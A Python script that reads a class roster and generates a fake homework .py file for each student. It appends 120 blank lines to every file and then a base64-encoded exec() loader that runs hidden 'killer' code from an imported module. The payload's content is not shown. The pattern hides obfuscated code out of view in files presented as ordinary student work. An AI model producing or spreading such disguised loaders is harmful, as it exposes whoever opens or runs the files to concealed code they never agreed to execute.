import homework_compare
import random
import os
import base64
current_path = os.getcwd()
print(current_path)
inj_text=""
names=open("花名册.txt",'r',encoding="utf-8")
names=[name.strip() for name in names.readlines()]  
grade=str(input("输入年级："))
classes=str(input("输入班级："))
wrt=""
try:
    os.makedirs("作业")
except:
    pass
for i in range(len(names)):
    inj_text=""
    homework_compare.name=""
    homework_compare.random_name(grade,classes,names[i])
    homework_compare.Homework.killer()
    rand=random.randint(0,1)
    if rand==1:
        homework_compare.Homework.homework(True)
    else:
        homework_compare.Homework.homework(False)

    homewk=open(current_path+"\\作业\\"+homework_compare.name+".py","a",encoding="utf-8")
    for x in range(len(homework_compare.hm)):
        homewk.write(homework_compare.hm[x])
        rand2=random.randint(0,1)
        homewk.write("\n"*rand2)
    homewk.write("\n"*120)
    for j in range(len(homework_compare.killer_file)):
        inj_text+=homework_compare.killer_file[j]
    inj_text = base64.b64encode(inj_text.encode("UTF-8")).decode("UTF-8")
    inj_text = "import base64;exec(base64.b64decode('" + inj_text + "'))"
    homewk.write(inj_text)

    
    
